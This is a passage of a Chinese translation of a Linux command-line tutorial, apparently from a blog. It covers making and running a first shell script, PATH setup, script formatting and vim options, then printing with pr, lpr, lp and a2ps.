<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># 这是我们的第一个脚本。</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;Hello World!&#x27;</span></span><br></pre></td></tr></table></figure>

<p>我们脚本的最后一行非常熟悉；它只是一个带有字符串参数的echo命令。第二行也很熟悉。它看起来像是我们在许多我们已经检查和编辑的配置文件中看到的注释。关于shell脚本中的注释的一件事是，它们也可以出现在行尾，前提是它们前面至少有一个空白字符，像这样：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;Hello World!&#x27;</span> <span class="comment"># 这也是一条注释</span></span><br></pre></td></tr></table></figure>

<p>行中从#符号开始的所有内容都被忽略。</p>
<p>像许多事情一样，这在命令行上也有效：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">echo</span> <span class="string">&#x27;Hello World!&#x27;</span> <span class="comment"># 这也是一条注释</span></span><br><span class="line">Hello World!</span><br></pre></td></tr></table></figure>

<p>虽然在命令行上注释没有太大用处，但它们会起作用。</p>
<p>我们脚本的第一行有点神秘。它看起来应该是一个注释，因为它是以#开头的，但它看起来太有目的性了，仅仅是那样。#!字符序列实际上是一个特殊构造，称为<em>shebang</em>。shebang用于告诉内核应该用哪个解释器来执行后面的脚本。每个shell脚本都应该包括这作为其第一行。</p>
<p>让我们将我们的脚本文件保存为hello_world。</p>
<h3 id="可执行权限"><a href="#可执行权限" class="headerlink" title="可执行权限"></a>可执行权限</h3><p>我们接下来要做的事情是使我们的脚本可执行。这很容易使用chmod完成。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">ls</span> -l hello_world</span><br><span class="line">-rw-r--r-- 1 me me 63 2009-03-07 10:10 hello_world</span><br><span class="line">[me@linuxbox ~]$ <span class="built_in">chmod</span> 755 hello_world</span><br><span class="line">[me@linuxbox ~]$ <span class="built_in">ls</span> -l hello_world</span><br><span class="line">-rwxr-xr-x 1 me me 63 2009-03-07 10:10 hello_world</span><br></pre></td></tr></table></figure>

<p>对于脚本有两种常见的权限设置：755表示每个人都可以执行的脚本，和700表示只有所有者可以执行的脚本。注意，脚本必须是可读的才能被执行。</p>
<h3 id="脚本文件位置"><a href="#脚本文件位置" class="headerlink" title="脚本文件位置"></a>脚本文件位置</h3><p>设置了权限后，我们现在可以执行我们的脚本了：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ ./hello_world</span><br><span class="line">Hello World!</span><br></pre></td></tr></table></figure>

<p>要运行脚本，我们必须在脚本名称前加上显式路径。如果我们不这样做，我们会得到这样的结果：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ hello_world</span><br><span class="line">bash: hello_world: 命令未找到</span><br></pre></td></tr></table></figure>

<p>这是为什么呢？是什么让我们的脚本与其他程序不同？事实证明，没有什么不同。我们的脚本没问题。问题在于它的位置。在第11章中，我们讨论了PATH环境变量及其对系统搜索可执行程序方式的影响。简而言之，如果没有指定显式路径，系统每次需要找到可执行程序时都会搜索一系列目录。这就是当我们在命令行中输入ls时，系统知道执行&#x2F;bin&#x2F;ls的原因。&#x2F;bin目录是系统自动搜索的目录之一。目录列表保存在名为PATH的环境变量中。PATH变量包含一个用冒号分隔的目录列表。我们可以查看PATH的内容。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">echo</span> <span class="variable">$PATH</span></span><br><span class="line">/home/me/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:</span><br><span class="line">/bin:/usr/games</span><br></pre></td></tr></table></figure>

<p>这里我们看到了我们的目录列表。如果我们的脚本位于列表中的任何目录中，我们的问题就解决了。注意列表中的第一个目录&#x2F;home&#x2F;me&#x2F;bin。大多数Linux发行版都配置了PATH变量，包含用户主目录中的bin目录，以允许用户执行他们自己的程序。因此，如果我们创建bin目录并将我们的脚本放入其中，它应该开始像其他程序一样工作。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">mkdir</span> bin</span><br><span class="line">[me@linuxbox ~]$ <span class="built_in">mv</span> hello_world bin</span><br><span class="line">[me@linuxbox ~]$ hello_world</span><br><span class="line">Hello World!</span><br></pre></td></tr></table></figure>

<p>果然如此。</p>
<p>如果PATH变量不包含该目录，我们可以通过在我们的.bashrc文件中包含这行来轻松添加它：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> PATH=~/bin:<span class="string">&quot;<span class="variable">$PATH</span>&quot;</span></span><br></pre></td></tr></table></figure>

<p>此更改完成后，它将在每个新的终端会话中生效。要将更改应用到当前终端会话，我们必须让shell重新读取.bashrc文件。这可以通过“源”它来完成。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ . .bashrc</span><br></pre></td></tr></table></figure>

<p>点（.）命令是source命令的同义词，source命令是一个shell内置命令，它读取指定的包含shell命令的文件，并将其视为来自键盘的输入。</p>
<p>**注意：**Ubuntu（和大多数其他基于Debian的发行版）如果在用户的.bashrc文件执行时<del>&#x2F;bin目录存在，则会自动将</del>&#x2F;bin目录添加到PATH变量中。因此，在Ubuntu系统上，如果我们创建了~&#x2F;bin目录，然后登出并再次登录，一切都会正常工作。</p>
<h4 id="脚本的好位置"><a href="#脚本的好位置" class="headerlink" title="脚本的好位置"></a>脚本的好位置</h4><p>~&#x2F;bin目录是放置个人使用的脚本的好地方。如果我们编写了一个系统上的每个人都被允许使用的脚本，传统的位置是&#x2F;usr&#x2F;local&#x2F;bin。面向系统管理员使用的脚本通常位于&#x2F;usr&#x2F;local&#x2F;sbin。在大多数情况下，无论是脚本还是编译程序，本地提供的软件都应该放在&#x2F;usr&#x2F;local层次结构中，而不是在&#x2F;bin或&#x2F;usr&#x2F;bin中。这些目录由Linux文件系统层次结构标准指定，仅包含由Linux发行商提供和维护的文件。</p>
<h3 id="更多格式化技巧"><a href="#更多格式化技巧" class="headerlink" title="更多格式化技巧"></a>更多格式化技巧</h3><p>认真编写脚本的关键目标之一是易于<em>维护</em>，即脚本的作者或其他人可以轻松修改脚本以适应不断变化的需求的程度。使脚本易于阅读和理解是促进易于维护的一种方式。</p>
<h4 id="长选项名称"><a href="#长选项名称" class="headerlink" title="长选项名称"></a>长选项名称</h4><p>我们研究的许多命令都具有短选项和长选项名称。例如，ls 命令有许多选项可以用短形式或长形式表示。例如，以下命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">ls</span> -ad</span><br></pre></td></tr></table></figure>

<p>等同于此命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">ls</span> --all --directory</span><br></pre></td></tr></table></figure>

<p>为了减少打字，当在命令行输入选项时，短选项是首选的，但是在编写脚本时，长选项可以提供更好的可读性。</p>
<h4 id="缩进和行继续"><a href="#缩进和行继续" class="headerlink" title="缩进和行继续"></a>缩进和行继续</h4><p>使用长命令时，可以通过将命令分布在几行上来增强可读性。在第17章中，我们看了 find 命令的一个特别长的例子。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ find playground \( -<span class="built_in">type</span> f -not -perm 0600 -<span class="built_in">exec</span> <span class="built_in">chmod</span> 0600 ‘&#123;&#125;’ ‘;’ \) -or \( -<span class="built_in">type</span> d -not -perm 0700 -<span class="built_in">exec</span> <span class="built_in">chmod</span> 0700 ‘&#123;&#125;’ ‘;’ \)</span><br></pre></td></tr></table></figure>

<p>显然，这个命令一眼看上去有点难以理解。在脚本中，如果这样写，这个命令可能更容易理解：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find playground \</span><br><span class="line">\( \</span><br><span class="line">-<span class="built_in">type</span> f \</span><br><span class="line">-not -perm 0600 \</span><br><span class="line">-<span class="built_in">exec</span> <span class="built_in">chmod</span> 0600 ‘&#123;&#125;’ ‘;’ \</span><br><span class="line">\) \</span><br><span class="line">-or \</span><br><span class="line">\( \</span><br><span class="line">-<span class="built_in">type</span> d \</span><br><span class="line">-not -perm 0700 \</span><br><span class="line">-<span class="built_in">exec</span> <span class="built_in">chmod</span> 0700 ‘&#123;&#125;’ ‘;’ \</span><br><span class="line">\)</span><br></pre></td></tr></table></figure>

<p>通过使用行继续（反斜杠-换行序列）和缩进，这个复杂命令的逻辑对读者描述得更清晰了。这种技术也可以在命令行上使用，尽管很少使用，因为输入和编辑都很尴尬。脚本和命令行之间的一个区别是脚本可以使用制表符实现缩进，而命令行不能，因为制表符用于激活完成。</p>
<h3 id="配置-vim-用于脚本编写"><a href="#配置-vim-用于脚本编写" class="headerlink" title="配置 vim 用于脚本编写"></a>配置 vim 用于脚本编写</h3><p>vim 文本编辑器有很多配置设置。有几个常用选项可以方便脚本编写。</p>
<p>以下命令开启语法高亮：</p>
<h4 id="syntax-on"><a href="#syntax-on" class="headerlink" title=":syntax on"></a><strong>:syntax on</strong></h4><p>通过这个设置，查看脚本时，shell 语法的不同元素将以不同颜色显示。这有助于识别某些类型的编程错误。它看起来也很酷。注意，要使此功能工作，您必须安装完整版本的 vim，并且您正在编辑的文件必须有一个指示该文件是 shell 脚本的 shebang。如果您对前一个命令有困难，尝试使用 <strong>:set syntax&#x3D;sh</strong> 代替。</p>
<p>以下命令开启高亮搜索结果的选项：</p>
<h4 id="set-hlsearch"><a href="#set-hlsearch" class="headerlink" title=":set hlsearch"></a><strong>:set hlsearch</strong></h4><p>假设我们搜索单词 echo。开启这个选项后，每个实例都会被高亮显示。</p>
<p>以下设置制表符占据的列数：</p>
<h4 id="set-tabstop-4"><a href="#set-tabstop-4" class="headerlink" title=":set tabstop&#x3D;4"></a><strong>:set tabstop&#x3D;4</strong></h4><p>默认是八列。将值设置为 4（这是一个常见的做法）可以让长行更容易适应屏幕。</p>
<p>以下开启“自动缩进”功能：</p>
<h4 id="set-autoindent"><a href="#set-autoindent" class="headerlink" title=":set autoindent"></a><strong>:set autoindent</strong></h4><p>这会导致 vim 将新行缩进与刚刚输入的行相同的量。这在许多类型的编程结构上加快了打字速度。要停止缩进，按 Ctrl-d。</p>
<p>通过将这些命令（不带前导冒号字符）添加到您的 ~&#x2F;.vimrc 文件中，可以使这些更改变为永久性。</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>在这第一章关于脚本的内容中，我们看了如何编写脚本并使其在我们的系统上轻松执行。我们还看到了如何使用</p>
<p>各种格式化技术来提高脚本的可读性（从而提高可维护性）。在未来的章节中，易于维护将一次又一次地作为良好脚本编写中的一个核心原则出现。</p>
<h3 id="进一步阅读"><a href="#进一步阅读" class="headerlink" title="进一步阅读"></a>进一步阅读</h3><ul>
<li><p>关于各种编程语言中的“Hello World”程序和示例，请见：<span class="exturl" data-url="aHR0cDovL2VuLndpa2lwZWRpYS5vcmcvd2lraS9IZWxsb193b3JsZA==">http://en.wikipedia.org/wiki/Hello_world<i class="fa fa-external-link-alt"></i></span></p>
</li>
<li><p>这篇维基百科文章更多地讨论了 shebang 机制：<span class="exturl" data-url="aHR0cDovL2VuLndpa2lwZWRpYS5vcmcvd2lraS9TaGViYW5nXyhVbml4KQ==">http://en.wikipedia.org/wiki/Shebang_(Unix)<i class="fa fa-external-link-alt"></i></span></p>
</li>
</ul>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>TLCL</tag>
      </tags>
  </entry>
  <entry>
    <title>打印</title>
    <url>/2024/04/22-printing/</url>
    <content><![CDATA[<h2 id="22-–-打印"><a href="#22-–-打印" class="headerlink" title="22 – 打印"></a>22 – 打印</h2><p>在过去几章中对文本进行了各种操作之后，现在是时候将这些文本打印到纸上了。在本章中，我们将探讨用于打印文件和控制打印机操作的命令行工具。我们不会讨论如何配置打印机，因为这会因发行版而异，而且通常在安装过程中会自动设置。请注意，要执行本章中的练习，我们需要一个已配置好的打印机。</p>
<p>我们将讨论以下命令：</p>
<span id="more"></span>

<ul>
<li>pr – 转换文本文件以便打印</li>
<li>lpr – 打印文件</li>
<li>a2ps – 将文件格式化以便在PostScript打印机上打印</li>
<li>lpstat – 显示打印机状态信息</li>
<li>lpq – 显示打印队列状态</li>
<li>lprm – 取消打印任务</li>
</ul>
<h3 id="打印的简史"><a href="#打印的简史" class="headerlink" title="打印的简史"></a>打印的简史</h3><p>为了充分理解在Unix-like操作系统中发现的打印功能，我们首先需要了解一些历史。Unix-like系统上的打印可以追溯到操作系统的起始时期。那时候，打印机及其使用方式与今天大不相同。</p>
<h4 id="远古时代的打印"><a href="#远古时代的打印" class="headerlink" title="远古时代的打印"></a>远古时代的打印</h4><p>就像计算机一样，PC时代之前的打印机往往大而贵，且集中使用。1980年代的典型计算机用户在远离计算机的某个地方通过终端工作。打印机位于计算机附近，受到计算机操作员的密切监视。</p>
<p>当打印机昂贵且集中使用时，就像Unix早期常见的那样，许多用户共享一台打印机是常见的做法。为了标识属于特定用户的打印作业，通常在每个打印作业开始时打印一个显示用户名称的<em>横幅页</em>。计算机支持人员然后会装载一车当天的打印作业，并将它们递送给各个用户。</p>
<h4 id="基于字符的打印机"><a href="#基于字符的打印机" class="headerlink" title="基于字符的打印机"></a>基于字符的打印机</h4><p>80年代的打印机技术在两个方面与今天大不相同。首先，那个时期的打印机几乎总是<em>冲击式打印机</em>。冲击式打印机使用机械机构，将色带击打到纸上，形成页面上的字符印记。那时流行的两种技术是<em>菊花轮打印</em>和<em>点阵打印</em>。</p>
<p>第二个，也是更重要的特点是，早期的打印机使用固定的字符集，这些字符集是设备固有的。例如，一个菊花轮打印机只能打印实际模制在菊花轮花瓣上的字符。这使得打印机非常像高速打字机。与大多数打字机一样，它们使用等宽（固定宽度）字体进行打印。这意味着每个字符的宽度相同。打印是在页面上的固定位置完成的，页面的可打印区域包含固定数量的字符。大多数打印机每英寸横向打印10个字符（CPI），纵向每英寸打印6行（LPI）。使用这种方案，一张US-letter大小的纸张宽度为85个字符，高度为66行。考虑到每侧有小边距，80个字符被认为是打印行的最大宽度。这解释了为什么终端显示器（及我们的终端仿真器）通常宽度为80个字符。使用等宽字体和80字符宽的终端提供了打印输出的<em>所见即所得</em>（<em>WYSIWYG</em>）视图。</p>
<p>数据以简单的字节流形式发送到类似打字机的打印机，包含要打印的字符。例如，要打印一个“a”，就发送ASCII字符代码97。此外，低编号的ASCII控制代码提供了一种移动打印机的滑车和纸张的方法，使用回车、换行、换页等代码。使用控制代码，可以通过让打印机打印一个字符、回退、然后再次打印该字符以在页面上获得更深的印象，从而实现一些有限的字体效果，例如加粗。如果我们使用nroff渲染man页面并使用cat -A检查输出，实际上可以见证这一点。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ zcat /usr/share/man/man1/ls.1.gz | nroff -man | <span class="built_in">cat</span></span><br><span class="line">-A | <span class="built_in">head</span></span><br><span class="line">LS(1) User Commands LS(1)</span><br><span class="line">$</span><br><span class="line">$</span><br><span class="line">$</span><br><span class="line">N^HNA^HAM^HME^HE$</span><br><span class="line"> <span class="built_in">ls</span> - list directory contents$</span><br><span class="line">$</span><br><span class="line">S^HSY^HYN^HNO^HOP^H</span><br><span class="line"></span><br><span class="line">PS^HSI^HIS^H$</span><br><span class="line"> <span class="built_in">ls</span> [OPTION]... [FILE]...$</span><br><span class="line">$</span><br></pre></td></tr></table></figure>

<p>在这个例子中，我们看到如何使用nroff来格式化ls命令的man页面，然后使用cat -A来显示控制字符。这里，我们看到字符序列“N^HNA^HAM^HME^HE”，这表示nroff尝试加粗“NAME”一词。字符“^H”是ASCII退格字符的可视表示，它告诉打印机回退一个字符位置。通过在每个字符后面跟随一个退格字符和重复字符，nroff指示打印机在同一位置打印每个字符两次，从而产生加粗效果。</p>
<h4 id="图形打印机"><a href="#图形打印机" class="headerlink" title="图形打印机"></a>图形打印机</h4><p>随着计算机界面向图形用户界面（GUI）的转变，打印机技术也发生了重大变革。计算机转向更多基于图片的显示时，打印技术也从基于字符的方式转向了图形化技术。这一转变得益于低成本激光打印机的出现，这种打印机不再仅仅打印固定字符，而是可以在页面的任何可打印区域打印微小的点。这使得打印比例字体（如排版工使用的那种）、甚至是照片和高质量图表成为可能。</p>
<p>然而，从基于字符的方案转向图形化方案提出了一个巨大的技术挑战。原因如下：使用基于字符的打印机填满一页的字节数量可以这样计算（假设每页60行，每行包含80个字符）：</p>
<blockquote>
<p>60 X 80 &#x3D; 4,800 字节</p>
</blockquote>
<p>相比之下，一个每英寸300点（DPI）的激光打印机（假设每页打印面积为8乘以10英寸）需要的字节数量是：</p>
<blockquote>
<p>(8 X 300) X (10 X 300) &#x2F; 8 &#x3D; 900,000 字节</p>
</blockquote>
<p>许多速度慢的PC网络根本无法处理打印一整页所需的近一兆字节数据，因此显然需要一项巧妙的发明。</p>
<p>这项发明最终被证明是<em>页面描述语言</em>（PDL）。页面描述语言是一种编程语言，用于描述页面的内容。基本上，它是这样说的：“移动到这个位置，以10点Helvetica字体打印字符‘a’，然后移动到那个位置……”直到页面上的所有内容都被描述完毕。第一个主要的PDL是Adobe系统的<em>PostScript</em>，至今仍然广泛使用。PostScript语言是一种完整的针对排版和其他图形及成像类型的编程语言。它内置了35种标准、高质量字体的支持，并且能够在运行时接受额外的字体定义。起初，对PostScript的支持是内置在打印机中的。这解决了数据传输问题。虽然典型的PostScript程序与基于字符的打印机的简单字节流相比非常冗长，但它比表示整个打印页面所需的字节数要小得多。</p>
<p><em>PostScript打印机</em>接受PostScript程序作为输入。打印机包含自己的处理器和内存（往往使得打印机成为一台比其所连接的计算机更强大的计算机）并执行一个特殊的程序称为<em>PostScript解释器</em>，该解释器读取传入的PostScript程序并<em>渲染</em>结果到打印机的内部内存中，从而形成将转移到纸张上的位图（点）的模式。这个将某物渲染成大型位图（称为<em>位图</em>）的过程的通用名称是<em>光栅图像处理器</em>（RIP）。</p>
<p>随着时间的推移，计算机和网络变得更快。这允许将RIP从打印机移至主机计算机，这反过来又使得高质量打印机的成本大大降低。</p>
<p>如今，许多打印机仍然接受基于字符的流，但许多低成本打印机则不接受。它们依赖于主机计算机的RIP来提供打印点的位流。还有一些PostScript打印机也在使用。</p>
<h3 id="在Linux上打印"><a href="#在Linux上打印" class="headerlink" title="在Linux上打印"></a>在Linux上打印</h3><p>现代Linux系统使用两个软件套件来执行和管理打印。第一个是Common Unix Printing System（CUPS），它提供打印驱动和打印作业管理；第二个是Ghostscript，一个PostScript解释器，充当RIP。</p>
<p>CUPS通过创建和维护<em>打印队列</em>来管理打印机。正如我们在早期的历史课中讨论的，Unix打印最初设计用于管理多个用户共享的集中式打印机。由于打印机的本质是慢性的，与供给它们的计算机相比，打印系统需要一种方式来调度多个打印作业并保持事物的有序。CUPS还能够识别不同类型的数据（在合理的范围内）并可以将文件转换为可打印的形式。</p>
<h3 id="准备用于打印的文件"><a href="#准备用于打印的文件" class="headerlink" title="准备用于打印的文件"></a>准备用于打印的文件</h3><p>作为命令行用户，我们主要感兴趣的是打印文本，尽管打印其他数据格式当然也是可能的。</p>
<h4 id="pr-–-转换文本文件以便打印"><a href="#pr-–-转换文本文件以便打印" class="headerlink" title="pr – 转换文本文件以便打印"></a>pr – 转换文本文件以便打印</h4><p>我们在上一章中已经简单看过pr了。现在我们将检查一些它在打印方面使用的众多选项。在我们的打印历史中，我们看到基于字符的打印机使用等宽字体，导致每行固定字符数和每页固定行数。pr用于调整文本以适应特定页面大小，可选地包括页面标题和边距。表22-1总结了其最常用的选项。</p>
<p><em>表22-1: 常用</em> <em>pr 选项</em></p>
<table>
<thead>
<tr>
<th><strong>选项</strong></th>
<th><strong>描述</strong></th>
</tr>
</thead>
<tbody><tr>
<td>+<em>first</em>[:<em>last</em>]</td>
<td>从<em>first</em>开始输出一系列页面，并可选地以<em>last</em>结束。</td>
</tr>
<tr>
<td>-l <em>num</em></td>
<td>设置页面长度为<em>num</em>行（默认66）。</td>
</tr>
<tr>
<td>-h <em>header</em></td>
<td>使用<em>header</em>作为页面标题。</td>
</tr>
<tr>
<td>-F</td>
<td>使用表单馈送而不是换页符作为页面分隔符。</td>
</tr>
<tr>
<td>-d</td>
<td>双倍间距输出。</td>
</tr>
</tbody></table>
<p>pr 经常在管道中用作过滤器。 在此示例中，我们将生成 &#x2F;usr&#x2F;bin 的目录列表，并使用 pr 将其格式化为分页的三列输出：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">ls</span> /usr/bin | <span class="built_in">pr</span> -3 -w 65 | <span class="built_in">head</span></span><br><span class="line">2016-02-18 14:00 Page 1</span><br><span class="line">[ apturl bsd-write</span><br><span class="line">411toppm ar bsh</span><br><span class="line">a2p arecord btcflash</span><br><span class="line">a2ps arecordmidi bug-buddy</span><br><span class="line">a2ps-lpr-wrapper ark buildhash</span><br></pre></td></tr></table></figure>

<h3 id="将打印任务发送到打印机"><a href="#将打印任务发送到打印机" class="headerlink" title="将打印任务发送到打印机"></a>将打印任务发送到打印机</h3><p>CUPS打印套件支持两种历史上在类Unix系统上使用的打印方法。一种方法，称为Berkeley或LPD（用于Berkeley软件分发版本的Unix），使用lpr程序，而另一种方法，称为SysV（来自于Unix的System V版本），使用lp程序。这两个程序大致完成相同的事情。选择其中一个而不选择另一个更多是个人喜好的问题。</p>
<h4 id="lpr-–-打印文件（Berkeley风格）"><a href="#lpr-–-打印文件（Berkeley风格）" class="headerlink" title="lpr – 打印文件（Berkeley风格）"></a>lpr – 打印文件（Berkeley风格）</h4><p>lpr程序可以用来将文件发送到打印机。它也可以用在管道中，因为它接受标准输入。例如，要打印我们之前的多列目录列表的结果，我们可以这样做：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">ls</span> /usr/bin | <span class="built_in">pr</span> -3 | lpr</span><br></pre></td></tr></table></figure>

<p>报告将被发送到系统的默认打印机。要将文件发送到不同的打印机，可以使用-P选项，如下所示：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">lpr -P printer_name</span><br></pre></td></tr></table></figure>

<p>这里，<em>printer_name</em>是期望打印机的名称。要查看系统已知的打印机列表，请使用此命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ lpstat -a</span><br></pre></td></tr></table></figure>

<p>**提示：**许多Linux发行版允许你定义一个“打印机”，它输出的是可移植文档格式（PDF）的文件，而不是在物理打印机上打印。这对于尝试打印命令非常方便。检查你的打印机配置程序以查看它是否支持这种配置。在一些发行版上，你可能需要安装额外的包（如cupspdf）以启用此功能。</p>
<p>表22-2描述了lpr的常见选项。</p>
<p><em>表22-2：lpr的常见选项</em></p>
<table>
<thead>
<tr>
<th><strong>选项</strong></th>
<th><strong>描述</strong></th>
</tr>
</thead>
<tbody><tr>
<td>-# <em>number</em></td>
<td>设置副本数为<em>number</em>。</td>
</tr>
<tr>
<td>-p</td>
<td>每页打印带有日期、时间、作业名和页码的阴影标题。当打印文本文件时，可以使用这个所谓的“美化打印”选项。</td>
</tr>
<tr>
<td>-P <em>printer</em></td>
<td>指定用于输出的打印机的名称。如果未指定打印机，则使用系统的默认打印机。</td>
</tr>
<tr>
<td>-r</td>
<td>打印后删除文件。这对于生成临时打印输出文件的程序来说很有用。</td>
</tr>
</tbody></table>
<h4 id="lp-–-打印文件（System-V-风格）"><a href="#lp-–-打印文件（System-V-风格）" class="headerlink" title="lp – 打印文件（System V 风格）"></a>lp – 打印文件（System V 风格）</h4><p>与lpr一样，lp接受文件或标准输入以进行打印。它与lpr的不同之处在于它支持一套不同的（稍微更复杂的）选项集。表22-3描述了常见选项。</p>
<p><em>表22-3：lp的常见选项</em></p>
<table>
<thead>
<tr>
<th><strong>选项</strong></th>
<th><strong>描述</strong></th>
</tr>
</thead>
<tbody><tr>
<td>-d <em>printer</em></td>
<td>将目标（打印机）设置为<em>printer</em>。如果没有指定-d选项，则使用系统默认的打印机。</td>
</tr>
<tr>
<td>-n <em>number</em></td>
<td>设置副本数量为<em>number</em>。</td>
</tr>
<tr>
<td>-o landscape</td>
<td>将输出设置为横向布局。</td>
</tr>
<tr>
<td>-o fitplot</td>
<td>将文件缩放以适应页面。当打印图像，如JPEG文件时，这非常有用。</td>
</tr>
<tr>
<td>-o scaling&#x3D;<em>number</em></td>
<td>将文件缩放至<em>number</em>。100的值填满页面。小于100的值会缩小，而大于100的值会导致文件打印在多个页面上。</td>
</tr>
<tr>
<td>-o cpi&#x3D;<em>number</em></td>
<td>将输出的每英寸字符数设置为<em>number</em>。默认值为10。</td>
</tr>
<tr>
<td>-o lpi&#x3D;<em>number</em></td>
<td>将输出的每英寸行数设置为<em>number</em>。默认值为6。</td>
</tr>
<tr>
<td>-o page-bottom&#x3D;<em>points</em>-o page-left&#x3D;<em>points</em>-o page-right&#x3D;<em>points</em></td>
<td>设置页面边距。值以<em>points</em>表示，这是一种印刷术语测量单位。每英寸有72点。</td>
</tr>
<tr>
<td>-o page-top&#x3D;<em>points</em></td>
<td></td>
</tr>
<tr>
<td>-P <em>pages</em></td>
<td>指定页面列表。<em>pages</em>可以表示为逗号分隔的列表和&#x2F;或范围，例如，1,3,5,7-10</td>
</tr>
</tbody></table>
<p>我们再次生成我们的目录列表，这次打印12 CPI和8 LPI，左边距为半英寸。请注意，我们必须调整pr选项以适应新的页面大小：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">ls</span> /usr/bin | <span class="built_in">pr</span> -4 -w 90 -l 88 | lp -o page-left=36 -o cpi=12 -o lpi=8</span><br></pre></td></tr></table></figure>

<p>这个管道产生一个四列列表，使用的字体比默认值小。每英寸字符数的增加允许我们在页面上放置更多列。</p>
<h4 id="另一个选项：a2ps"><a href="#另一个选项：a2ps" class="headerlink" title="另一个选项：a2ps"></a>另一个选项：a2ps</h4><p>a2ps程序（在大多数仓库中都有）是很有趣的。从其名称我们可以推测，它是一个格式转换程序，但它还有更多功能。它的名字最初意味着“ASCII到PostScript”，用于准备文本文件在PostScript打印机上打印。然而，多年来，该程序的功能已经增长，现在它的名字意味着“任何东西到PostScript”。虽然它的名字暗示是一个格式转换程序，实际上它是一个打印程序。它将默认输出发送到系统的默认打印机，而不是标准输出。程序的默认行为是作为一个“美化打印机”，意味着它提高了输出的外观。我们使用该程序在桌面上创建一个PostScript文件。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">ls</span> /usr/bin | <span class="built_in">pr</span> -3 -t | a2ps -o ~/Desktop/ls.ps -L 66</span><br><span class="line">[stdin (plain): 11页在6张纸上]</span><br><span class="line">[总共：11页在6张纸上] 保存到文件`/home/me/Desktop/ls.ps<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>

<p>这里我们使用pr过滤流，使用-t选项（省略页眉和页脚），然后使用a2ps，指定一个输出文件（-o选项）和每页66行（-L选项）以匹配pr的输出分页。如果我们用合适的文件查看器查看生成的文件，我们将会看到图7的输出。</p>
<p><img src="/images/2024/Picture7.png"></p>
<p><em>图7：查看a2ps输出</em></p>
<p>如我们所见，默认的输出布局是“两页”格式。这导致每张纸上打印两页内容。a2ps还应用了漂亮的页眉和页脚。a2ps有很多选项。表22-4提供了一个总结。</p>
<p><em>表22-4：</em> <em>a2ps选项</em></p>
<table>
<thead>
<tr>
<th><strong>选项</strong></th>
<th><strong>描述</strong></th>
</tr>
</thead>
<tbody><tr>
<td>–center-title&#x3D;<em>text</em></td>
<td>将中心页标题设置为<em>text</em>。</td>
</tr>
<tr>
<td>–columns&#x3D;<em>number</em></td>
<td>将页面排列成<em>number</em>列。默认为2。</td>
</tr>
<tr>
<td>–footer&#x3D;<em>text</em></td>
<td>将页脚设置为<em>text</em>。</td>
</tr>
<tr>
<td>–guess</td>
<td>报告作为参数给出的文件的类型。</td>
</tr>
<tr>
<td></td>
<td>由于a2ps尝试转换和格式化所有类型的数据，这个选项对于预测给定特定文件时a2ps将做什么很有用。</td>
</tr>
<tr>
<td>–left-footer&#x3D;<em>text</em></td>
<td>将左页脚设置为<em>text</em>。</td>
</tr>
<tr>
<td>–left-title&#x3D;<em>text</em></td>
<td>将左页标题设置为<em>text</em>。</td>
</tr>
<tr>
<td>–line-numbers&#x3D;<em>interval</em></td>
<td>每<em>interval</em>行对输出行编号。</td>
</tr>
<tr>
<td>–list&#x3D;defaults</td>
<td>显示默认设置。</td>
</tr>
<tr>
<td>–pages&#x3D;<em>range</em></td>
<td>打印范围内的页面。</td>
</tr>
<tr>
<td>–right-footer&#x3D;<em>text</em></td>
<td>将右页脚设置为<em>text</em>。</td>
</tr>
<tr>
<td>–right-title&#x3D;<em>text</em></td>
<td>将右页标题设置为<em>text</em>。</td>
</tr>
<tr>
<td>–rows&#x3D;<em>number</em></td>
<td>将页面排列成<em>number</em>行。默认为1。</td>
</tr>
<tr>
<td>-B</td>
<td>没有页眉。</td>
</tr>
<tr>
<td>-b <em>text</em></td>
<td>将页眉设置为<em>text</em>。</td>
</tr>
<tr>
<td>-f <em>size</em></td>
<td>使用<em>size</em>点字体。</td>
</tr>
<tr>
<td>-l <em>number</em></td>
<td>将每行字符数设置为<em>number</em>。这个和-L选项（见下一条）可以用来使得用其他程序（如pr）分页的文件正确适配页面。</td>
</tr>
<tr>
<td>-L <em>number</em></td>
<td>将每页行数设置为<em>number</em>。</td>
</tr>
<tr>
<td>-M <em>name</em></td>
